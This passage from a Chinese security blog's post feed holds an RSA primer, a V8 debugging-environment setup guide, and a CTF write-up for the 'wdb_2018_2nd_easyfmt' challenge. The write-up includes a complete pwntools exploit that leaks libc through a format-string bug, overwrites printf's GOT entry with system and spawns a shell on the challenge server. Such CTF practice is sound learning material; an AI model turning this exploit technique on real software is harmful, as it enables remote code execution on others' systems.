        <tag>unsortedbin attack</tag>
      </tags>
  </entry>
  <entry>
    <title>rsa算法</title>
    <url>/2021/10/08/18-44/</url>
    <content><![CDATA[<blockquote>
<p>久闻大名，ctf的密码学题目，easyRSA</p>
<p>因为实验里面需要加密解密，就看了下这个使用最为广泛的非对称加密算法。</p>
</blockquote>
<ul>
<li><a href="https://www.bilibili.com/video/BV14y4y1272w?from=search&amp;seid=10798640508792660489&amp;spm_id_from=333.337.0.0" target="_blank" rel="noopener">视频1</a></li>
<li><a href="https://www.bilibili.com/video/BV1kE411h7ui?from=search&amp;seid=10798640508792660489&amp;spm_id_from=333.337.0.0" target="_blank" rel="noopener">视频2</a></li>
<li><a href="https://www.bilibili.com/video/BV1sZ4y1H7WC?from=search&amp;seid=10798640508792660489&amp;spm_id_from=333.337.0.0" target="_blank" rel="noopener">视频3</a></li>
</ul>
<p>加密的宏观上：为了能让Bob安全的给Alice发送消息。</p>
<p>首先Alice生成公钥和私钥（对应锁和钥匙），然后Alice将锁给Bob，那么Bob用锁给信息加密后，将加密后的东西还给Alice，Alice用钥匙解密即可拿到Bob的信息。但是其他人虽然能看到锁，但是无法解密，因为没有钥匙。</p>
<p><img src="/2021/10/08/18-44/image-20210910190119327.png" alt="image-20210910190119327"></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>模运算是单向运算</p>
<p>有e容易求c，但是有c难求e</p>
<p><img src="/2021/10/08/18-44/image-20210910190422813.png" alt="image-20210910190422813"></p>
<p>加密解密过程：e和N是给大家都能看到，但是d是Alice持有的钥匙，只有Alice能计算的</p>
<p><img src="/2021/10/08/18-44/image-20210910190457576.png" alt="image-20210910190457576"></p>
<p>mod的模数e和余数c是互质的，所以上面吧m^e带入下面的c得到下面公式</p>
<p><img src="/2021/10/08/18-44/image-20210910191513110.png" alt="image-20210910191513110"></p>
<h3 id="欧拉函数"><a href="#欧拉函数" class="headerlink" title="欧拉函数"></a>欧拉函数</h3><p>定理</p>
<p><img src="/2021/10/08/18-44/image-20210910190649163.png" alt="image-20210910190649163"></p>
<p>所以建立式子</p>
<p><img src="/2021/10/08/18-44/image-20210910190538216.png" alt="image-20210910190538216"></p>
<p><img src="/2021/10/08/18-44/image-20210910191715034.png" alt="image-20210910191715034"></p>
<p><img src="/2021/10/08/18-44/image-20210910191737898.png" alt="image-20210910191737898"></p>
<p>所以，取两个质数，p*q=n</p>
<p>其他人来说：已知n，但φ(n)难以求解</p>
<p>拥有私钥p、q的人来说：p和q因为是质数很好求容易求得</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">φ(n)&#x3D;φ(p)*φ(q)&#x3D;(p-1)*(q-1)</span><br></pre></td></tr></table></figure>
<p>就可以求得d，成功解出答案</p>
]]></content>
  </entry>
  <entry>
    <title>v8环境搭建</title>
    <url>/2020/10/11/16-35/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>搭个环境而已，花了我n久，哭泣。。。</p>
<p>这里就讲下自己搭环境的经过，，，</p>
<hr>
<p>使用的环境：ubuntu 18.04</p>
<h2 id="初次尝试：本地"><a href="#初次尝试：本地" class="headerlink" title="初次尝试：本地"></a>初次尝试：本地</h2><h3 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h3><p>主要参考的是这两篇博客：</p>
<p><a href="https://eternalsakura13.com/2018/05/06/v8/" target="_blank" rel="noopener">https://eternalsakura13.com/2018/05/06/v8/</a></p>
<p><a href="https://bbs.pediy.com/thread-252812.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-252812.htm</a></p>
<hr>
<h3 id="vpn"><a href="#vpn" class="headerlink" title="vpn"></a>vpn</h3><blockquote>
<p>我的本地代理，开了没用，不知道为什么，本机可以上google，但是虚拟机里怎么都不可以，，，然后，，选择在虚拟机里面使用vpn</p>
</blockquote>
<p>这个是我用的：<a href="https://neworld.date/user（简单好用而且不贵）" target="_blank" rel="noopener">https://neworld.date/user（简单好用而且不贵）</a></p>
<p>linux的教程：<a href="https://support.neworld.date/linux/（不要用自动配置，一次性的，后面出问题了，还是要上手动配置）" target="_blank" rel="noopener">https://support.neworld.date/linux/（不要用自动配置，一次性的，后面出问题了，还是要上手动配置）</a></p>
<p>别的问题不大，注意的两点是：</p>
<p>1.要使用的时候，需要在命令前面加上<code>proxychains4</code></p>
<p>2.选择节点的时候，一定要选择有人的</p>
<p>3.一定是root账户</p>
<p>4.在/root目录下</p>
<p>执行命令 <code>proxychains4 curl myip.ipip.net</code> 。如果显示empty server类似的</p>
<p>那就重新来一遍（建议：wmware弄个快照，，每次都重新配，心真的很累），，，我当时玄学，学校里的网不行（貌似是因为校园网不能翻外网），连了自己的热点就可以了。</p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install binutils python2.7 perl socat git build-essential gdb gdbserver</span><br></pre></td></tr></table></figure>
<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><h5 id="depot-tools"><a href="#depot-tools" class="headerlink" title="depot_tools"></a>depot_tools</h5><p>这个工具是用来得到v8源码的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root$ cd ~</span><br><span class="line">(proxychains4 )git clone https:&#x2F;&#x2F;chromium.googlesource.com&#x2F;chromium&#x2F;tools&#x2F;depot_tools.git</span><br><span class="line">echo &#39;export PATH&#x3D;$PATH:&quot;&#x2F;root&#x2F;depot_tools&quot;&#39; &gt;&gt; ~&#x2F;.bashrc</span><br></pre></td></tr></table></figure>
<h5 id="ninja"><a href="#ninja" class="headerlink" title="ninja"></a>ninja</h5><p>这个工具是用来编译v8的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root$ cd ~</span><br><span class="line">(proxychains4 )git clone https:&#x2F;&#x2F;github.com&#x2F;ninja-build&#x2F;ninja.git</span><br><span class="line">cd ninja &amp;&amp; .&#x2F;configure.py --bootstrap &amp;&amp; cd ..</span><br><span class="line">echo &#39;export PATH&#x3D;$PATH:&quot;&#x2F;root&#x2F;ninja&quot;&#39; &gt;&gt; ~&#x2F;.bashrc</span><br></pre></td></tr></table></figure>
<p>echo两句命令，主要是写入环境变量，后期fetch v8的时候，可能会说找不到fetch命令，可能就是环境变量没了，可以通过vim ~/.bashrc，查看最后面是否有下面这两句话，没有的话，加上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export PATH&#x3D;$PATH:&quot;&#x2F;root&#x2F;depot_tools&quot;</span><br><span class="line">export PATH&#x3D;$PATH:&quot;&#x2F;root&#x2F;ninja&quot;</span><br><span class="line">bash									&#x2F;&#x2F;载入环境变量</span><br></pre></td></tr></table></figure>
<p>然后就是编译启动，我卡死在了v8，真的很慢，而且最后报错，，，出错，网上看了好多，也没解决，，，TAT</p>
<p>后面的步骤</p>
<h4 id="v8编译"><a href="#v8编译" class="headerlink" title="v8编译"></a>v8编译</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ fetch v8 &amp;&amp; cd v8&amp;&amp; gclient sync</span><br><span class="line">$ tools&#x2F;dev&#x2F;v8gen.py x64.debug</span><br><span class="line">$ ninja -C out.gn&#x2F;x64.debug</span><br></pre></td></tr></table></figure>
<h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;out&#x2F;x64.debug&#x2F;d8</span><br><span class="line">$ .&#x2F;out&#x2F;x64.debug&#x2F;shell</span><br></pre></td></tr></table></figure>
<p>初始尝试失败，，搞了好久都没出来，，，，但是网上大部分都是这种方法</p>
<hr>
<h2 id="二次尝试"><a href="#二次尝试" class="headerlink" title="二次尝试"></a>二次尝试</h2><h3 id="参考博客："><a href="#参考博客：" class="headerlink" title="参考博客："></a>参考博客：</h3><p><a href="https://eternalsakura13.com/2018/06/26/v8_environment/" target="_blank" rel="noopener">https://eternalsakura13.com/2018/06/26/v8_environment/</a></p>
<h3 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h3><blockquote>
<p>sakura为我们提供了第二种方法，我一开始试了下，但是谷歌云搞不来，没有信用卡啥的。但是后来只能尝试这个，所以找了下其他国外的云服务器。</p>
<p>不需要代理啥的，真是舒服。</p>
<p>知乎上的这篇给了较好的帮助：<a href="https://zhuanlan.zhihu.com/p/130402190" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/130402190</a></p>
</blockquote>
<p>我使用的是狗云，进来，“创建景点云服务器”，我一开始用的10G的硬盘，编译的时候发现太小了，然后只好销毁重来一个（这个只要三个工作日内，支持销毁退款）</p>
<p>操作系统选择这个：CentOS 7 BBR，ubuntu 18我也用了，但还是出问题了</p>
<p><img src="/2020/10/11/16-35/image-20201010130803778.png" alt="image-20201010130803778"></p>
<p>然后进入“我的经典云服务器”，启动，用xshell远程连过去</p>
<p><img src="/2020/10/11/16-35/image-20201010131058668.png" alt="image-20201010131058668"></p>
<h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="fetch源码"><a href="#fetch源码" class="headerlink" title="fetch源码"></a>fetch源码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo yum groupinstall &quot;Development Tools&quot;  </span><br><span class="line">sudo yum install -y git gdb bzip2 wget</span><br><span class="line">cd ~</span><br><span class="line">git clone https:&#x2F;&#x2F;chromium.googlesource.com&#x2F;chromium&#x2F;tools&#x2F;depot_tools.git</span><br><span class="line">export PATH&#x3D;&#96;pwd&#96;&#x2F;depot_tools:&quot;$PATH&quot;</span><br><span class="line">mkdir v8</span><br><span class="line">cd v8</span><br><span class="line">fetch v8</span><br><span class="line">cd ~&#x2F;v8&#x2F;v8</span><br><span class="line">git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598(2019-starctf这道入门题)</span><br><span class="line">gclient sync</span><br><span class="line">.&#x2F;tools&#x2F;dev&#x2F;v8gen.py x64.release(这个真的很慢，要耐心)</span><br><span class="line">ninja -C .&#x2F;out.gn&#x2F;x64.release # Release version</span><br><span class="line">.&#x2F;tools&#x2F;dev&#x2F;v8gen.py x64.debug</span><br><span class="line">ninja -C .&#x2F;out.gn&#x2F;x64.debug # Debug version</span><br></pre></td></tr></table></figure>
<h5 id="release版本和debug版本"><a href="#release版本和debug版本" class="headerlink" title="release版本和debug版本"></a>release版本和debug版本</h5><p>上面的12-15行中，12-13两行下载的是release版本，14-15行下载的是debug版本。release版本可以正常运行，但是有些调试信息不能用，如job命令，执行起来的时候，也会告诉我们，没有调试的符号。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg: loaded 186 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with print&#x2F;break)</span><br><span class="line">Reading symbols from .&#x2F;d8...(no debugging symbols found)...done.</span><br></pre></td></tr></table></figure>
<p>debug就是调试版本，可以输入更多的调试信息。虽然debug看着好，但是，，，后面有点问题，，，两个都下过来就好。</p>
<p><img src="/2020/10/11/16-35/image-20201015161210557.png" alt="image-20201015161210557"></p>
<p>下过来之后，是这样的。</p>
<p>我们进入x64.debug就可以调试状态下运行d8。。同理release</p>
<h4 id="搭建ftp服务器"><a href="#搭建ftp服务器" class="headerlink" title="搭建ftp服务器"></a>搭建ftp服务器</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~</span><br><span class="line">tar -czvf v8.tar v8</span><br><span class="line">sudo yum install vsftpd -y</span><br><span class="line">systemctl start vsftpd.service(在CentOS7和它之前，启动vsftpd服务的指令是 service vsftpd start，之后要使用新指令)</span><br><span class="line">sudo netstat -nltp | grep 21</span><br><span class="line">cp v8.tar &#x2F;var&#x2F;ftp&#x2F;</span><br></pre></td></tr></table></figure>
<p>然后，浏览器就可以访问到了，点击下载即可。</p>
<p><img src="/2020/10/11/16-35/image-20201011095616016.png" alt="image-20201011095616016"></p>
<p>哇哇哇哇，感天动地，终于搞定了。</p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>实例程序(test.js)：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> c = [a, b];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第一次调试</span></span><br><span class="line">%DebugPrint(b);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第二次调试</span></span><br><span class="line">%DebugPrint(c);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第三次调试</span></span><br></pre></td></tr></table></figure>
<h4 id="v8的gdb"><a href="#v8的gdb" class="headerlink" title="v8的gdb"></a>v8的gdb</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~&#x2F;v8&#x2F;v8&#x2F;tools</span><br><span class="line">mv gdbinit gdbinit_v8</span><br><span class="line">cp gdbinit_v8 ~&#x2F;.gdbinit_v8</span><br><span class="line">cd ~ </span><br><span class="line">vim .gdbinit</span><br><span class="line">#加入下面内容</span><br><span class="line">source ~&#x2F;.gdbinit_v8</span><br><span class="line">source ~&#x2F;v8&#x2F;v8&#x2F;tools&#x2F;gdb-v8-support.py</span><br></pre></td></tr></table></figure>
<p>命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug&#x2F;</span><br><span class="line">将test.js放到该目录下</span><br><span class="line">gdb .&#x2F;d8</span><br><span class="line">gdb-peda$ set args --allow-natives-syntax .&#x2F;test.js</span><br><span class="line">gdb-peda$ r</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: &#x2F;home&#x2F;winter&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug&#x2F;d8 --allow-natives-syntax .&#x2F;test.js</span><br><span class="line">[...]</span><br><span class="line">DebugPrint: 0x3847d864df19: [JSArray]</span><br><span class="line"> - map: 0x27aca0f42d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x33ab2b711111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3847d864de39 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x27d6f1300c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x1f78960401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3847d864de39 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x3847d864df19(这个地址根据第九行那里显示地址)</span><br><span class="line">0x3847d864df19: [JSArray]</span><br><span class="line"> - map: 0x27aca0f42d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x33ab2b711111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3847d864de39 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x27d6f1300c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x1f78960401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3847d864de39 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>v8的gdb也可以了</p>
<h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tools&#x2F;dev&#x2F;gm.py x64.debug d8</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>v8</category>
      </categories>
      <tags>
        <tag>环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>wdb_2018_2nd_easyfmt详解</title>
    <url>/2021/04/25/23-34/</url>
    <content><![CDATA[<blockquote>
<p>wdb_2018_2nd_easyfmt详解</p>
<p>自己做出来了，，，，还看其他人的</p>
<p>参考：<a href="[wdb_2018_2nd_easyfmt](https://www.cnblogs.com/luoleqi/p/13498183.html">wdb_2018_2nd_easyfmt</a>)</p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><p>程序流程非常简单，可以一直进行格式化字符串漏洞。</p>
<p><img src="/2021/04/25/23-34/image-20210425225434398.png" alt="image-20210425225434398"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol>
<li>首先通过格式化字符串泄露栈信息</li>
<li>通过格式化字符串修改printf_got表为system（one_gadget本地打通了，远程没有，，）</li>
<li>发送“/bin/sh\x00”，</li>
</ol>
<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="0-查看基本信息"><a href="#0-查看基本信息" class="headerlink" title="0.查看基本信息"></a>0.查看基本信息</h4><p>32位程序，只开了nx</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ file wdb_2018_2nd_easyfmt </span><br><span class="line">wdb_2018_2nd_easyfmt: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib&#x2F;ld-linux.so.2, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;f86851c3576d0aabf0b0b2310d835d0f6e660eb8, not stripped</span><br><span class="line">winter@ubuntu:~&#x2F;buu$ checksec wdb_2018_2nd_easyfmt </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;wdb_2018_2nd_easyfmt&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>格式化字符串，偏移为6</p>
<p><img src="/2021/04/25/23-34/image-20210425233348293.png" alt="image-20210425233348293"></p>
<h4 id="1-泄露信息"><a href="#1-泄露信息" class="headerlink" title="1.泄露信息"></a>1.泄露信息</h4><h5 id="方法一：栈上数据"><a href="#方法一：栈上数据" class="headerlink" title="方法一：栈上数据"></a>方法一：栈上数据</h5><blockquote>
<p>可以直接查看栈上的信息进行泄露</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; stack 30</span><br><span class="line">00:0000│ esp      0xffffcfbc —▸ 0x80485cf (main+132) ◂— add    esp, 0x10</span><br><span class="line">01:0004│          0xffffcfc0 —▸ 0xffffcfd8 ◂— &#39;aaaa\n&#39;</span><br><span class="line">... ↓</span><br><span class="line">03:000c│          0xffffcfc8 ◂— 0x64 &#x2F;* &#39;d&#39; *&#x2F;</span><br><span class="line">04:0010│          0xffffcfcc —▸ 0xf7e9379b (handle_intel+107) ◂— add    esp, 0x10	#libc中的数据，计算偏移即可得到libc基址</span><br><span class="line">05:0014│          0xffffcfd0 —▸ 0xffffcffe —▸ 0xffff0000 ◂— 0x0</span><br><span class="line">06:0018│          0xffffcfd4 —▸ 0xffffd0fc —▸ 0xffffd2e9 ◂— &#39;XDG_VTNR&#x3D;7&#39;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">"Do you know repeater?"</span>)</span><br><span class="line">payload = <span class="string">"%3$p"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">handle_intel_107 = p.recvuntil(<span class="string">"f7"</span>)[<span class="number">-2</span>:]</span><br><span class="line">handle_intel_107 += p.recv(<span class="number">8</span>)</span><br><span class="line">handle_intel_107 = int(handle_intel_107,<span class="number">16</span>)</span><br><span class="line">log.success(hex(handle_intel_107))</span><br><span class="line"></span><br><span class="line"><span class="comment">#[+] 0xf7e658fb</span></span><br></pre></td></tr></table></figure>
<p>通过脚本输出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000 0      &#x2F;home&#x2F;winter&#x2F;buu&#x2F;wdb_2018_2nd_easyfmt</span><br><span class="line"> 0x8049000  0x804a000 r--p     1000 0      &#x2F;home&#x2F;winter&#x2F;buu&#x2F;wdb_2018_2nd_easyfmt</span><br><span class="line"> 0x804a000  0x804b000 rw-p     1000 1000   &#x2F;home&#x2F;winter&#x2F;buu&#x2F;wdb_2018_2nd_easyfmt</span><br><span class="line">0xf7dd5000 0xf7dd6000 rw-p     1000 0      </span><br><span class="line">0xf7dd6000 0xf7f83000 r-xp   1ad000 0      &#x2F;home&#x2F;winter&#x2F;buu&#x2F;libc-2.23-32.so</span><br><span class="line">0xf7f83000 0xf7f84000 ---p     1000 1ad000 &#x2F;home&#x2F;winter&#x2F;buu&#x2F;libc-2.23-32.so</span><br><span class="line">0xf7f84000 0xf7f86000 r--p     2000 1ad000 &#x2F;home&#x2F;winter&#x2F;buu&#x2F;libc-2.23-32.so</span><br><span class="line">0xf7f86000 0xf7f87000 rw-p     1000 1af000 &#x2F;home&#x2F;winter&#x2F;buu&#x2F;libc-2.23-32.so</span><br><span class="line">0xf7f87000 0xf7f8b000 rw-p     4000 0      </span><br><span class="line">0xf7f8b000 0xf7f8e000 r--p     3000 0      [vvar]</span><br><span class="line">0xf7f8e000 0xf7f90000 r-xp     2000 0      [vdso]</span><br><span class="line">0xf7f90000 0xf7fb3000 r-xp    23000 0      &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">0xf7fb3000 0xf7fb4000 r--p     1000 22000  &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">0xf7fb4000 0xf7fb5000 rw-p     1000 23000  &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">0xff999000 0xff9ba000 rw-p    21000 0      [stack]</span><br></pre></td></tr></table></figure>
<p>计算偏移为：0xf7e658fb - 0xf7dd6000 = 0x8F8FB</p>
<p>故可以得到libc_base</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">libc_base &#x3D; handle_intel_107 - 0x8f8fb - 0x20	#0x20是因为远程的时候，发现好像有0x20的偏移，一般libc_base是000结尾，但是原来是020结尾,故猜测还要再减去0x20</span><br><span class="line">log.success(hex(libc_base))</span><br></pre></td></tr></table></figure>
<h5 id="方法二：直接泄露got表信息（方便）"><a href="#方法二：直接泄露got表信息（方便）" class="headerlink" title="方法二：直接泄露got表信息（方便）"></a>方法二：直接泄露got表信息（方便）</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p.recvuntil(&quot;Do you know repeater?&quot;)</span><br><span class="line">payload &#x3D; p32(elf.got[&#39;printf&#39;]) + &quot;%6$s&quot;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">printf_addr &#x3D; u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">print(hex(printf_addr))</span><br><span class="line">libc_base &#x3D; printf_addr - libc.sym[&#39;printf&#39;]</span><br></pre></td></tr></table></figure>
<p>因为偏移是6，所以直接输入printf_got，输出该地址内容时候，就泄露了printf的地址。</p>
<h4 id="2-格式化字符串写printf-got"><a href="#2-格式化字符串写printf-got" class="headerlink" title="2.格式化字符串写printf_got"></a>2.格式化字符串写printf_got</h4><p>利用pwntool的工具来做</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system &#x3D; libc_base + libc.sym[&#39;system&#39;]</span><br><span class="line">printf_got &#x3D; elf.got[&#39;printf&#39;]</span><br><span class="line"></span><br><span class="line">payload &#x3D; fmtstr_payload(offset,&#123;printf_got:system&#125;)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30wx 0x804a014</span><br><span class="line">0x804a014:	0xf7e3a940	0xf7e5f140	0xf7e18540	0xf7e60da0</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30wx 0xf7e3a940</span><br><span class="line">0xf7e3a940 &lt;system&gt;:	0x8b0cec83	0xe8102444	0x000e2941	0x56b4c281</span><br></pre></td></tr></table></figure>
<h4 id="3-发送”-bin-sh-x00”字符串"><a href="#3-发送”-bin-sh-x00”字符串" class="headerlink" title="3.发送”/bin/sh\x00”字符串"></a>3.发送”/bin/sh\x00”字符串</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p.sendline(&quot;&#x2F;bin&#x2F;sh\x00&quot;)</span><br></pre></td></tr></table></figure>
<p>执行<code>printf(&amp;buf);</code> =&gt; system(“/bin/sh\x00”)</p>
<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process("./wdb_2018_2nd_easyfmt")</span></span><br><span class="line">p=process([<span class="string">'./wdb_2018_2nd_easyfmt'</span>],env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/home/winter/buu/libc-2.23-32.so"</span>&#125;)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25745</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">elf = ELF(<span class="string">"./wdb_2018_2nd_easyfmt"</span>)</span><br><span class="line"><span class="comment"># libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"/home/winter/buu/libc-2.23-32.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil("Do you know repeater?")</span></span><br><span class="line"><span class="comment"># payload = "%3$p"</span></span><br><span class="line"><span class="comment"># p.sendline(payload)</span></span><br><span class="line"><span class="comment"># handle_intel_107 = p.recvuntil("f7")[-2:]</span></span><br><span class="line"><span class="comment"># handle_intel_107 += p.recv(8)</span></span><br><span class="line"><span class="comment"># handle_intel_107 = int(handle_intel_107,16)</span></span><br><span class="line"><span class="comment"># log.success(hex(handle_intel_107))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_base = handle_intel_107 - 0x8f8fb - 0x20	#direct sub</span></span><br><span class="line"><span class="comment"># log.success(hex(libc_base))</span></span><br><span class="line">p.recvuntil(<span class="string">"Do you know repeater?"</span>)</span><br><span class="line">payload = p32(elf.got[<span class="string">'printf'</span>]) + <span class="string">"%6$s"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">printf_addr = u32(p.recvuntil(<span class="string">"\xf7"</span>)[<span class="number">-4</span>:])</span><br><span class="line">print(hex(printf_addr))</span><br><span class="line">libc_base = printf_addr - libc.sym[<span class="string">'printf'</span>]</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">offset = <span class="number">6</span></span><br><span class="line">log.success(hex(printf_got))</span><br><span class="line">payload = fmtstr_payload(offset,&#123;printf_got:system&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>buu</category>
      </categories>
      <tags>
        <tag>fmt</tag>
      </tags>
  </entry>
  <entry>
    <title>winter</title>
    <url>/2020/07/23/18-38/</url>
    <content><![CDATA[<p>who am i</p>
<p>hexo主题：<a href="https://hexo.io/themes/" target="_blank" rel="noopener">https://hexo.io/themes/</a></p>
<hr>
<h3 id="添加目录"><a href="#添加目录" class="headerlink" title="添加目录"></a>添加目录</h3><blockquote>
<p>发现可以添加目录，还以为没有呢</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">toc: true</span><br></pre></td></tr></table></figure>
<h3 id="附件"><a href="#附件" class="headerlink" title="附件"></a>附件</h3><blockquote>
<p>做题，发现别人博客没贴附件可太难受了，所以接下来会把附件都贴一下。</p>
</blockquote>
<p><code>[名字](对应文章目录下的文件名)</code></p>
